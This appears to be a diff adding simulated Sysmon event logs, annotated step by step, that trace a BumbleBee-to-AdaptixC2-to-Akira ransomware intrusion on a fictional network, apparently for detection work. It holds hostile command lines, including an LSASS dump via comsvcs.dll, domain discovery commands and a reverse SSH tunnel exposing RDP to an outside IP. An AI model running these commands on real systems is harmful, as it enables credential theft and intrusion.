@@ -1,0 +1,187 @@
+[
+  {
+    "TimeCreated": "2025-07-15T14:02:49Z",
+    "EventID": 1,
+    "EventType": "ProcessCreate",
+    "Computer": "WS-IT-07.contoso.com",
+    "User": "CONTOSO\\jsmith",
+    "Image": "C:\\Windows\\System32\\msiexec.exe",
+    "CommandLine": "msiexec.exe /i \"\\\\FS01\\share\\downloads\\ManageEngine-OpManager.msi\"",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Hashes": "MD5=124a48b78060fa851e1cc077ca35713c,SHA256=186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da"
+  },
+  {
+    "TimeCreated": "2025-07-15T14:02:55Z",
+    "EventID": 11,
+    "EventType": "FileCreate",
+    "Computer": "WS-IT-07.contoso.com",
+    "User": "CONTOSO\\jsmith",
+    "Image": "C:\\Windows\\System32\\msiexec.exe",
+    "TargetFilename": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\ApplicationInstallationFolder_11\\msimg32.dll"
+  },
+  {
+    "TimeCreated": "2025-07-15T14:03:01Z",
+    "EventID": 1,
+    "EventType": "ProcessCreate",
+    "Computer": "WS-IT-07.contoso.com",
+    "User": "CONTOSO\\jsmith",
+    "Image": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\ApplicationInstallationFolder_11\\consent.exe",
+    "CommandLine": "consent.exe",
+    "ParentImage": "C:\\Windows\\System32\\msiexec.exe"
+  },
+  {
+    "TimeCreated": "2025-07-15T14:03:02Z",
+    "EventID": 7,
+    "EventType": "ImageLoad",
+    "Computer": "WS-IT-07.contoso.com",
+    "Image": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\ApplicationInstallationFolder_11\\consent.exe",
+    "ImageLoaded": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\ApplicationInstallationFolder_11\\msimg32.dll",
+    "Signed": "false",
+    "Hashes": "MD5=ca8646dfc88423bb9fffda811160cebe,SHA256=a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331",
+    "Note": "DLL side-load: consent.exe loads non-System32 msimg32.dll (BumbleBee)"
+  },
+  {
+    "TimeCreated": "2025-07-15T14:05:18Z",
+    "EventID": 3,
+    "EventType": "NetworkConnect",
+    "Computer": "WS-IT-07.contoso.com",
+    "Image": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\ApplicationInstallationFolder_11\\consent.exe",
+    "SourceIp": "10.10.20.37",
+    "DestinationIp": "188.40.187.145",
+    "DestinationPort": 443,
+    "Protocol": "tcp",
+    "Note": "BumbleBee C2 over TLS"
+  },
+  {
+    "TimeCreated": "2025-07-15T14:06:44Z",
+    "EventID": 22,
+    "EventType": "DnsQuery",
+    "Computer": "WS-IT-07.contoso.com",
+    "Image": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\ApplicationInstallationFolder_11\\consent.exe",
+    "QueryName": "ev2sirbd269o5j.org",
+    "QueryStatus": "0",
+    "Note": "BumbleBee DGA lookup (14-char .org)"
+  },
+  {
+    "TimeCreated": "2025-07-15T14:30:58Z",
+    "EventID": 1,
+    "EventType": "ProcessCreate",
+    "Computer": "WS-IT-07.contoso.com",
+    "User": "CONTOSO\\jsmith",
+    "Image": "C:\\Users\\jsmith\\AppData\\Local\\AdgNsy.exe",
+    "CommandLine": "AdgNsy.exe",
+    "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+    "OriginalFileName": "WAB.EXE",
+    "Note": "AdaptixC2 payload (renamed WAB.exe) spawned via WMI"
+  },
+  {
+    "TimeCreated": "2025-07-15T14:31:10Z",
+    "EventID": 8,
+    "EventType": "CreateRemoteThread",
+    "Computer": "WS-IT-07.contoso.com",
+    "SourceImage": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\ApplicationInstallationFolder_11\\consent.exe",
+    "TargetImage": "C:\\Users\\jsmith\\AppData\\Local\\AdgNsy.exe",
+    "StartModule": null,
+    "Note": "Reflective process injection of Adaptix shellcode"
+  },
+  {
+    "TimeCreated": "2025-07-15T14:32:03Z",
+    "EventID": 3,
+    "EventType": "NetworkConnect",
+    "Computer": "WS-IT-07.contoso.com",
+    "Image": "C:\\Users\\jsmith\\AppData\\Local\\AdgNsy.exe",
+    "SourceIp": "10.10.20.37",
+    "DestinationIp": "172.96.137.160",
+    "DestinationPort": 80,
+    "Protocol": "tcp",
+    "Note": "AdaptixC2 HTTP beacon"
+  },
+  {
+    "TimeCreated": "2025-07-15T14:40:11Z",
+    "EventID": 1,
+    "EventType": "ProcessCreate",
+    "Computer": "WS-IT-07.contoso.com",
+    "User": "CONTOSO\\jsmith",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c systeminfo & nltest /dclist: & whoami /groups & nltest /domain_trusts",
+    "ParentImage": "C:\\Users\\jsmith\\AppData\\Local\\AdgNsy.exe",
+    "Note": "Host + domain discovery"
+  },
+  {
+    "TimeCreated": "2025-07-16T09:20:05Z",
+    "EventID": 13,
+    "EventType": "RegistryValueSet",
+    "Computer": "DC01.contoso.com",
+    "User": "CONTOSO\\backup_EA",
+    "Image": "C:\\Windows\\System32\\reg.exe",
+    "TargetObject": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections",
+    "Details": "DWORD (0x00000000)",
+    "Note": "RDP enabled via registry"
+  },
+  {
+    "TimeCreated": "2025-07-16T09:35:22Z",
+    "EventID": 1,
+    "EventType": "ProcessCreate",
+    "Computer": "DC01.contoso.com",
+    "User": "CONTOSO\\backup_EA",
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+000024 672 \\Windows\\Temp\\U8Vfsh.docx full",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "Note": "LSASS memory dump via comsvcs.dll MiniDump, fake .docx extension"
+  },
+  {
+    "TimeCreated": "2025-07-16T10:02:47Z",
+    "EventID": 1,
+    "EventType": "ProcessCreate",
+    "Computer": "DC01.contoso.com",
+    "User": "CONTOSO\\backup_EA",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "pOWerShELl.exE -e SQBudgB2AG8AawBlAC0AUwBoAGEAcgBlAEYAaQBuAGQAZQByAA==",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "Note": "Encoded PowerShell (mixed-case), decodes to Invoke-ShareFinder"
+  },
+  {
+    "TimeCreated": "2025-07-16T10:18:30Z",
+    "EventID": 1,
+    "EventType": "ProcessCreate",
+    "Computer": "DC01.contoso.com",
+    "User": "CONTOSO\\backup_EA",
+    "Image": "C:\\ProgramData\\n.exe",
+    "CommandLine": "n.exe /auto:C:\\ProgramData\\scan.xml /range:10.10.10.0-10.10.10.255",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "Note": "SoftPerfect Network Scanner"
+  },
+  {
+    "TimeCreated": "2025-07-16T21:58:14Z",
+    "EventID": 1,
+    "EventType": "ProcessCreate",
+    "Computer": "DC01.contoso.com",
+    "User": "CONTOSO\\backup_EA",
+    "Image": "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
+    "CommandLine": "ssh svc@193.242.184.150 -R *:10400:127.0.0.1:3389 -p22 -N",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+    "Note": "Reverse SSH tunnel exposing RDP externally"
+  },
+  {
+    "TimeCreated": "2025-07-16T23:41:07Z",
+    "EventID": 3,
+    "EventType": "NetworkConnect",
+    "Computer": "FS01.contoso.com",
+    "Image": "C:\\Program Files\\FileZilla FTP Client\\filezilla.exe",
+    "SourceIp": "10.10.10.20",
+    "DestinationIp": "185.174.100.203",
+    "DestinationPort": 22,
+    "Protocol": "tcp",
+    "Note": "SFTP exfiltration channel (user Stark)"
+  },
+  {
+    "TimeCreated": "2025-07-17T03:22:41Z",
+    "EventID": 11,
+    "EventType": "FileCreate",
+    "Computer": "BKP01.contoso.com",
+    "User": "CONTOSO\\backup_EA",
+    "Image": "C:\\ProgramData\\locker.exe",
+    "TargetFilename": "G:\\Finance\\2025-Q2-ledger.xlsx.akira",
+    "Note": "Ransomware writing encrypted files with .akira extension"
+  }
+]
